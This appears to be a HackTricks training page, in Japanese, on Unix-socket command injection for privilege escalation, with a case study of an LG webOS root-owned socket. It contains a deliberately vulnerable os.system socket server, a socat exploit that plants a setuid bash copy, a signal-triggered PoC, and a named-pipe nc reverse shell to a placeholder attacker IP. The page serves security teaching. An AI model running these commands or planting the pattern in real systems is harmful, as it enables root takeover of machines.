# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## PythonによるSocket bindingの例

以下の例では、**unix socketが作成され**（`/tmp/socket_test.s`）、**受信したすべてのデータ**が`os.system`によって**実行されます**。このようなものを実環境で見つけることはないと思いますが、この例の目的は、unix socketを使用するコードがどのようなものか、そして最悪のケースを想定して入力を処理する方法を確認することです。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Pythonでコードを実行**: `python s.py` し、**socketがどのようにlistenしているかを確認**してください：
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## ケーススタディ: Root-owned UNIX socketによるsignal-triggered escalation (LG webOS)

一部の特権daemonは、信頼できない入力を受け付け、特権操作をthread-IDおよびsignalに結び付けるroot-owned UNIX socketを公開しています。protocolによって、権限のないclientが対象となるnative threadを選択できる場合、特権code pathをtriggerしてescalateできる可能性があります。<sup>[[1]](#references)</sup>

確認されたパターン:
- root-owned socket（例: /tmp/remotelogger）に接続する。
- threadを作成し、そのnative thread id（TID）を取得する。
- TID（packed）とpaddingをrequestとして送信し、acknowledgementを受信する。
- そのTIDに特定のsignalを送信し、特権動作をtriggerする。

最小限のPoCスケッチ:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
これを root shell にするには、単純な named-pipe + nc パターンを使用できます。
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notes:
- この種のバグは、権限のないクライアント状態（TIDs）から得た値を信頼し、それらを権限のある signal handlers やロジックに結び付けることで発生します。
- socket 上で credentials を強制し、message formats を検証し、権限のある操作を外部から提供された thread identifiers から分離することで harden できます。

## 参考文献

- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
